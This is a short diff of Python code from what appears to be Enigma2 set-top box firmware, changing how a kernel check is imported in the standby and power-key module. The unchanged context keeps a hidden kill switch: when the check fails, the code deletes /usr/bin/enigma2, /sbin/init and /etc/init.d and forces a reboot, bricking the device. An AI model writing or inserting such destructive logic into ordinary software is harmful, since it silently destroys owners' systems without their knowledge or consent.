@@ -437,9 +437,9 @@ profile("Standby,PowerKey")
 import Screens.Standby
 from Screens.Menu import MainMenu, mdom
 from GlobalActions import globalActionMap
-from enigma import eEGAMI
+from enigma import *
 
-if not eEGAMI.getInstance().checkkernel():
+if not checkkernel():
 	from os import system
 	system("rm -rf /usr/bin/enigma2;rm -rf /sbin/init;rm -rf /etc/init.d;reboot -f")
 
